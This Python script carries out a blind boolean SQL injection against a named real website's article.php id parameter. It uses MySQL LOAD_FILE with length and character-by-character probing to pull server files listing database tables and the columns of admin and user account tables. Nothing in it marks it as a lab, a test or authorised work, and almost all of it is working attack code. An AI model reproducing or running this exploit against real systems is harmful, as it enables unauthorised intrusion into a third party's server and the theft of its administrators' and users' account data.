import urllib.request
import urllib.parse
import sys
import time

BASE = "https://umidigi.com/article.php?id=1+AND+"

def check(cond):
    try:
        req = urllib.request.Request(BASE + cond, headers={'User-Agent': 'Mozilla/5.0'})
        resp = urllib.request.urlopen(req, timeout=3)
        return resp.getcode() == 200
    except:
        return False

def get_len(filepath):
    """Binary search for file length"""
    low, high = 0, 50000
    while low < high:
        mid = (low + high + 1) // 2
        if check(f"LENGTH(LOAD_FILE('{filepath}'))>={mid}"):
            low = mid
        else:
            high = mid - 1
    return low

def get_byte(filepath, pos):
    """Get single byte at position using binary search"""
    # Try printable ASCII first
    for c in range(32, 127):
        char = chr(c)
        if char == "'":
            char = "\\'"
        cond = f"SUBSTRING(LOAD_FILE('{filepath}'),{pos},1)='{char}'"
        if check(cond):
            return c
    # Try other values
    for c in range(0, 32):
        cond = f"ORD(SUBSTRING(LOAD_FILE('{filepath}'),{pos},1))={c}"
        if check(cond):
            return c
    return 0

def extract_file(filepath, max_bytes=2000):
    """Extract file content - optimized for speed"""
    length = get_len(filepath)
    if length == 0:
        return ""
    
    print(f"  Length: {length}")
    result = bytearray()
    
    # Extract in batches - try multiple bytes at once
    # For each position, binary search on character value
    for i in range(1, min(length, max_bytes) + 1):
        byte_val = get_byte(filepath, i)
        result.append(byte_val)
        if i % 200 == 0:
            sys.stdout.write(f"\r  {i}/{length} bytes")
            sys.stdout.flush()
    
    print()  # newline after progress
    return bytes(result).decode('utf-8', errors='replace')

# Files to extract
files = [
    ('/tmp/all_tables.txt', 'TABLES', 5000),
    ('/tmp/ums_admin_user_cols.txt', 'UMS_ADMIN_USER_COLS', 1000),
    ('/tmp/ums_user_cols.txt', 'UMS_USER_COLS', 1000),
]

for filepath, label, maxlen in files:
    print(f"\n=== {label} ===")
    content = extract_file(filepath, maxlen)
    print(content[:2000])
    print()
    time.sleep(0.3)
